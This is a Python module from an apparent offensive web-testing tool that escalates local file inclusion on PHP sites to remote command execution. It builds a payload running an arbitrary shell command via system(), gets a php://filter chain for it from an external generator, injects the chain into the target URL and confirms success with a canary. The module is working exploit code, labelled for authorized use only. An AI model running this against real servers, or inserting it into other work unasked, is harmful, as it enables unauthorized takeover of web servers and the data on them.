"""LFI-to-RCE via PHP filter chains.

traverse delivers the chain and confirms execution with a canary. Generating the
chain (the iconv conversion table) is deferred to the upstream Synacktiv tool —
https://github.com/synacktiv/php_filter_chain_generator — which is NOT
redistributed here (it carries no license). Point --filter-chain-gen at a local
copy of that script and traverse drives it.

AUTHORIZED USE ONLY.
"""
import re
import subprocess
import sys
import uuid

from .transport import inject, send, FUZZ
from .detector import classify

_CHAIN_RE = re.compile(r"php://filter/\S+")


def from_generator(generator_path: str, php_code: str) -> str:
    """Run the upstream generator to build a filter chain for `php_code`."""
    proc = subprocess.run([sys.executable, generator_path, "--chain", php_code],
                          capture_output=True, text=True, timeout=60)
    m = _CHAIN_RE.search(proc.stdout)
    if not m:
        raise RuntimeError("generator produced no php://filter chain "
                           f"(stderr: {proc.stderr.strip()[:200]})")
    return m.group(0)


def deliver(session, url_template, chain, nonce, method=None):
    """Inject the chain at the FUZZ point, send, and confirm via the canary."""
    resp = send(session, method or "GET", inject(url_template, chain))
    result = classify(resp.text, resp.status_code, None, 0, 200, nonce=nonce)
    if result["hit"]:
        return [{"target": "filter-chain", "category": "lfi-rce",
                 "payload": chain[:120] + ("…" if len(chain) > 120 else ""),
                 "method": method or "GET", "confidence": result["confidence"],
                 "snippet": result["snippet"]}]
    return []


def run_filter_chain(session, url_template, cmd, generator_path, method=None):
    """Build a canary-carrying PHP payload, generate its filter chain via the
    upstream tool, deliver it, and confirm code execution."""
    if FUZZ not in (url_template or ""):
        raise ValueError("A FUZZ marker is required in the URL for filter chains.")
    if not generator_path:
        raise ValueError("--filter-chain needs --filter-chain-gen pointing at a "
                         "local php_filter_chain_generator.py")
    nonce = "TRAVERSE_" + uuid.uuid4().hex[:12]
    php = f"<?php echo '{nonce}'; system('{cmd}'); ?>"
    chain = from_generator(generator_path, php)
    return deliver(session, url_template, chain, nonce, method=method)
